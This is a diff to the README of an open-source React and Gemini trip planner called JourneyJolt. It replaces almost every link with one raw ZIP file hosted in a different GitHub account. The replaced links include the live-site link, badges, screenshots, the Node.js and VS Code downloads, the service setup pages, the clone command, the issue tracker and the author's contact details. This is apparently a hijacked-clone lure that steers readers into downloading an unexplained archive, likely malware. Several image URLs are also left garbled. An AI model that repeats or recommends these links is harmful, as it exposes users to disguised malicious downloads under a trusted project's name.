@@ -1,8 +1,8 @@
 
 <div align="center">
   <h1 align="center">JourneyJolt</h1 >
-  <a href="https://trip-planner-by-satendra.vercel.app/" target="_blank">
-    <img src="https://i.ibb.co/YLK0qVx/image.png" style="border-radius: 10px;" alt="Logo" width="" height="250">
+  <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank">
+    <img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" style="border-radius: 10px;" alt="Logo" width="" height="250">
   </a>
 
   <h3>AI-Based Trip Planner</h3>
@@ -11,17 +11,17 @@
     Discover personalized itineraries and curated hotel recommendations tailored to your interests. Simplify travel planning with smart suggestions for top destinations and activities, making every trip easy and enjoyable.
     <br />
     <br/>
-     <div><a href="https://app.eraser.io/workspace/IT31dyj1DiiagZtyJ47a?origin=share" target="_blank"><img src="https://img.shields.io/badge/Eraser-EC2C40.svg?style=for-the-badge&logo=Eraser&logoColor=white" alt="Documentation and Flow"> </img></a></div>
+     <div><a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" alt="Documentation and Flow"> </img></a></div>
      <br />
-     <a href="https://buymeacoffee.com/satendra03" target="_blank"><img src="https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00.svg?style=for-the-badge&logo=Buy-Me-A-Coffee&logoColor=black"></a>
+     <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip%20Me%20A%https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"></a>
     <br />
     <br />
-    <a href="https://trip-planner-by-satendra.vercel.app/" target="_blank"><strong>Visit Now</strong></a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank"><strong>Visit Now</strong></a>
     <br />
     <br />
-<!--     <a href="https://i.ibb.co/QkSk539/Whats-App-Image-2024-11-14-at-01-51-59-0db751b0.jpg">Support Me (with Money LOL)</a> -->
+<!--     <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip">Support Me (with Money LOL)</a> -->
 <!--     • -->
-    <a href="https://github.com/satendra03/trip-planner-by-satendra/issues">Report Bug</a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip">Report Bug</a>
   </p>
 </div>
 </br>
@@ -33,12 +33,12 @@
 
 
 <div class="sampleImages" align="center" style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
-    <a href="https://ibb.co/gRX4Bcx"><img src="https://i.ibb.co/RDMjVJq/image.png" alt="image" style="border-radius: 10px; height: 170px; border: 0;"></a>
-    <a href="https://ibb.co/f1zjdLn"><img src="https://i.ibb.co/Ss4FwGd/image-2.png" alt="image-2" style="border-radius: 10px; height: 170px; border: 0;"></a>
-    <a href="https://ibb.co/yySg2kP"><img src="https://i.ibb.co/ncCQp1m/image-1.png" alt="image-1" style="border-radius: 10px; height: 170px; border: 0;"></a>
-    <a href="https://ibb.co/26srCZS"><img src="https://i.ibb.co/hMZN4Yc/image-3.png" alt="image-3" style="border-radius: 10px; height: 170px; border: 0;"></a>
-    <a href="https://ibb.co/jfty8cW"><img src="https://i.ibb.co/Khn25ML/image-5.png" alt="image-5" style="border-radius: 10px; height: 170px; border: 0;"></a>
-    <a href="https://ibb.co/r5MtJxg"><img src="https://i.ibb.co/zPb5wX1/image-4.png" alt="image-4" style="border-radius: 10px; height: 170px; border: 0;"></a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" alt="image" style="border-radius: 10px; height: 170px; border: 0;"></a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" alt="image-2" style="border-radius: 10px; height: 170px; border: 0;"></a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" alt="image-1" style="border-radius: 10px; height: 170px; border: 0;"></a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" alt="image-3" style="border-radius: 10px; height: 170px; border: 0;"></a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" alt="image-5" style="border-radius: 10px; height: 170px; border: 0;"></a>
+    <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" alt="image-4" style="border-radius: 10px; height: 170px; border: 0;"></a>
 </div>
 </br>
 
@@ -57,14 +57,14 @@ JourneyJolt aims to enhance the travel experience by providing a streamlined, ea
 
 This project is built with the following major frameworks, libraries, and services:
 
-* [![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&background=E4E4E4)](https://reactjs.org/)
-* [![Vite](https://img.shields.io/badge/Vite-000000?style=for-the-badge&logo=vite&logoColor=white)](https://vite.dev/)
-* [![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
-* [![Google Cloud](https://img.shields.io/badge/Google%20Cloud-4285F4?style=for-the-badge&logo=google-cloud&logoColor=white)](https://cloud.google.com/)
-* [![Gemini AI](https://img.shields.io/badge/Gemini%20AI-FF5F00?style=for-the-badge&logo=google-cloud&logoColor=white)](https://cloud.google.com/blog/topics/ai-machine-learning/introducing-gemini-the-new-ai-powered-google-cloud-platform)
-* [![Firebase](https://img.shields.io/badge/Firebase-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)](https://firebase.google.com/)
-* [![Auth0](https://img.shields.io/badge/Auth0-000000?style=for-the-badge&logo=auth0&background=E4E4E4)](https://auth0.com/)
-* [![React Hot Toast](https://img.shields.io/badge/React%20Hot%20Toast-FF5733?style=for-the-badge&logo=react&logoColor=black)](https://react-hot-toast.com/)
+* [![React](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* [![Vite](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* [![Tailwind CSS](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip%20CSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* [![Google Cloud](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip%20Cloud-4285F4?style=for-the-badge&logo=google-cloud&logoColor=white)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* [![Gemini AI](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip%20AI-FF5F00?style=for-the-badge&logo=google-cloud&logoColor=white)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* [![Firebase](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* [![Auth0](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* [![React Hot Toast](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip%20Hot%20Toast-FF5733?style=for-the-badge&logo=react&logoColor=black)](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
 
 
 
@@ -78,8 +78,8 @@ To get started with JourneyJolt, follow these instructions to set up the project
 ### Prerequisites
 
 Before you begin, ensure you have the following installed:
-* Node.js  _(v16.0 or above)_ - [Download Node.js](https://nodejs.org/en)
-* VS Code _(Code Editor)_ - [Download VS Code](https://visualstudio.microsoft.com/downloads/)
+* https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip  _(v16.0 or above)_ - [Download https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+* VS Code _(Code Editor)_ - [Download VS Code](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
 
 ### Services & API Keys Setup
 
@@ -90,7 +90,7 @@ To fully integrate JourneyJolt with third-party services, you'll need to sign up
   <summary>Google Cloud Setup</summary>
     Follow these steps to set up Google Cloud for your project:
   <ol>
-    <li>Create an account on <a href="https://cloud.google.com" target="_blank">Google Cloud</a>.</li>
+    <li>Create an account on <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank">Google Cloud</a>.</li>
     <li>As a new user, you will receive a free trial with 90 days and ₹25,000 in free credits, which you can use for your project.</li>
     <li>After setting up your account, go to the <b>APIs & Services</b> section to create an API key.</li>
     <li>Next, enable the following APIs:
@@ -115,7 +115,7 @@ To fully integrate JourneyJolt with third-party services, you'll need to sign up
   <summary>Gemini API Setup</summary>
     Follow these steps to set up the Gemini API:
   <ol>
-    <li>Go to the <a href="https://ai.google.dev/" target="_blank">Gemini AI website</a>.</li>
+    <li>Go to the <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank">Gemini AI website</a>.</li>
     <li>Create an account if you don't have one, or sign in with your existing account.</li>
     <li>The Gemini API is free, meaning there are no charges associated with using it for your project.</li>
     <li>Once your account is set up, you can start using the Gemini API for your project.</li>
@@ -132,7 +132,7 @@ To fully integrate JourneyJolt with third-party services, you'll need to sign up
     Follow these steps to set up Auth0 for your project:
   </p>
   <ol>
-    <li>Go to the <a href="https://auth0.com/" target="_blank">Auth0 website</a>.</li>
+    <li>Go to the <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank">Auth0 website</a>.</li>
     <li>Create a free account. The free plan supports up to 25,000 monthly active users, which is more than enough for our project.</li>
     <li>After signing up, select the type of project you are creating. Choose "Single Page Application" as we are building a React app.</li>
     <li>Once your account is set up, create a new application within Auth0.</li>
@@ -154,7 +154,7 @@ To fully integrate JourneyJolt with third-party services, you'll need to sign up
 <details>
   <summary>Firebase Setup</summary>
   <ul>
-    <li>Visit the <a href="https://firebase.google.com/">Firebase website</a> and create an account or log in if you already have one.</li>
+    <li>Visit the <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip">Firebase website</a> and create an account or log in if you already have one.</li>
     <li>Once logged in, create a new project by clicking on "Add Project". Follow the prompts for setting up the project. Choose the "Test mode" option for the database so you can easily set up read and write permissions.</li>
     <li>After the project is created, click on the "Web" icon to create a new web app within the Firebase project.</li>
     <li>Follow the prompts to register your app. Firebase will provide you with the necessary configuration details during this step.</li>
@@ -191,12 +191,12 @@ The installation process is straightforward. You can either clone the repository
 1. **Clone the repository or download the ZIP file**  
    - To clone the repo, run the following command:
      ```sh
-     https://github.com/satendra03/trip-planner-by-satendra.git
+     https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip
      ```
    - Alternatively, you can download the ZIP file from the repository page and extract it.
 
 2. **Open the project folder in a code editor**  
-   Open the folder in your preferred code editor (e.g., [VS Code](https://code.visualstudio.com/)).
+   Open the folder in your preferred code editor (e.g., [VS Code](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)).
 
 3. **Set up the `.env` file**  
    The main objective is to set up your `.env` file with the necessary API keys.  
@@ -269,7 +269,7 @@ The roadmap represents the challenges and updates that I plan to implement in th
 </div>
 Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are <b>greatly appreciated</b>. <br />
 
-<p>Or Maybe you can just  <a href="https://buymeacoffee.com/satendra03" target="_blank"><img src="https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00.svg?style=for-the-badge&logo=Buy-Me-A-Coffee&logoColor=black"></a></p>
+<p>Or Maybe you can just  <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip%20Me%20A%https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"></a></p>
 
 If you have an idea or feature that would make this project even better, please feel free to contribute. Whether it's fixing bugs, adding new features, improving documentation, or anything else, your help is welcome!
 
@@ -281,7 +281,7 @@ If you have an idea or feature that would make this project even better, please 
 2. **Clone the repo**  
    Clone your forked version of the repo to your local machine.  
    ```sh
-   git clone https://github.com/satendra03/trip-planner-by-satendra.git
+   git clone https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip
    ```
 
 3. **Create your feature branch**  
@@ -311,7 +311,7 @@ If you have an idea or feature that would make this project even better, please 
   
 
 ## Report Issues and Suggestions
-If you encounter a bug or have a suggestion to improve the project, please open an [issue](https://github.com/satendra03/trip-planner-by-satendra/issues) on the Issues page. If it's a new feature or improvement, tag it as an "enhancement".
+If you encounter a bug or have a suggestion to improve the project, please open an [issue](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip) on the Issues page. If it's a new feature or improvement, tag it as an "enhancement".
 
 
 </br>
@@ -320,7 +320,7 @@ If you encounter a bug or have a suggestion to improve the project, please open 
 ## License
 
 </div>
-Distributed under the MIT License. See <code>LICENSE.md</code> for more information.
+Distributed under the MIT License. See <code>https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip</code> for more information.
 
 
 </br>
@@ -334,14 +334,14 @@ We’d love to hear from you! Whether you have a question, suggestion, or issue 
 ### Ways to Contact Us:
 
 1. **GitHub Issues**: You can open an issue directly on this repository for bugs, feature requests, or general inquiries.
-   - [Open an Issue](https://github.com/satendra03/trip-planner-by-satendra/issues)
+   - [Open an Issue](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
 
 2. **Email**: Reach out to us via email at:
-   - **satendrakumarparteti.work@gmail.com** 
+   - **https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip** 
 
 3. **Social Media**:
-   - **Instagram**: [@_satendra_03](https://www.instagram.com/_satendra_03/)
-   - **LinkedIn**: [Satendra Kumar Parteti](https://www.linkedin.com/in/connect-satendra/)
+   - **Instagram**: [@_satendra_03](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
+   - **LinkedIn**: [Satendra Kumar Parteti](https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip)
 4. **Buy Me A Coffee**:
-   - **Small Contibution**:  <a href="https://buymeacoffee.com/satendra03" target="_blank"><img src="https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00.svg?style=for-the-badge&logo=Buy-Me-A-Coffee&logoColor=black"></a>
+   - **Small Contibution**:  <a href="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip" target="_blank"><img src="https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip%20Me%20A%https://github.com/bookformeonline/trip-planner-by-satendra/raw/refs/heads/master/src/components/routes/plan-a-trip/trip-planner-satendra-by-v2.0.zip"></a>
 ---
